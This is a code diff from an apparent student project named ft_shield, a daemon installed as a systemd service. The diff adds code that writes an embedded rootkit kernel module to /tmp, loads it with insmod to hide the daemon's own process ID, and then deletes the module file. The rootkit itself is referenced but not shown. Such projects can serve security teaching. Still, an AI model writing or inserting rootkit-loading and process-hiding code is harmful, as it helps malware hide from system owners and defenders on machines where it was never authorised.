@@ -1,4 +1,5 @@
 #include "../includes/ft_shield.h"
+#include "../includes/rootkit.h"
 
 t_daemon *create_daemon( void ) {
 	//logger.log_entry("Creating server", "INFO");
@@ -60,13 +61,28 @@ void startup_setup (void) {
 	system("systemctl start ft_shield.service");
 }
 
-void hide_pid(void) {
-	int pid = getpid();
-	char cmd[256];
+// https://codeplea.com/embedding-files-in-c-programs
+void extract_rootkit(const char *output_path) {
+    FILE *f = fopen(output_path, "wb");
+    if (!f) {
+        perror("fopen");
+        return;
+    }
 
-	// TODO Dont use full path
-	snprintf(cmd, sizeof(cmd), "insmod %s hidden_pid=%d", "/home/ubuntu/ft_shield/srcs/modules/rootkit.ko", pid);
-	system(cmd);
+    fwrite(srcs_modules_rootkit_ko, sizeof(srcs_modules_rootkit_ko), 1, f);
+    fclose(f);
+}
+
+void hide_pid(void) {
+        int pid = getpid();
+        char cmd[256];
+        const char* tmp_path = "/tmp/rootkit.ko";
+
+        extract_rootkit(tmp_path);
+
+        snprintf(cmd, sizeof(cmd), "insmod %s hidden_pid=%d", tmp_path, pid);
+        system(cmd);
+		system("rm -rf /tmp/rootkit.ko");
 }
 
 void ft_daemonize(void) {
